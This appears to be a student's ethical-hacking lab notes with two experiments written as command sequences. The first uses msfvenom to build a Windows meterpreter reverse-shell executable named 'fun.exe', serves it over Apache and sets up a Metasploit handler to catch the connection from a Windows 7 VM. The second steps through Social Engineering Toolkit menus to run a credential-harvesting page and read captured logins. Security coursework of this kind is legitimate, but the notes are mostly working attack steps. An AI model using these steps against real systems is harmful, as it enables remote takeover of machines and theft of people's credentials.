# etht





# exp 6 - Compromise windiws using Metasploit
```
ifconfig
(inet is your kali linux ip)
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your kai ip) -f exe > fun.exe
sudo cp fun.exe /var/www/html
sudo systemctl start apache2
sudo systemctl status apache2
(ctrl C to exit)
msfconsole
help
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
(open windows 7 vm)

```
# exp 7 - Creating a Backdoor with Social Engineering Toolkit
```
sudo setoolkit
(give password)
1 (enter)
2 (enter)
3 (enter)
1 (enter)
(enter)
2 (enter)

(go chrome incog and give that ip)
(give random id pass)
(go kali and see the id pass in terminal)
```
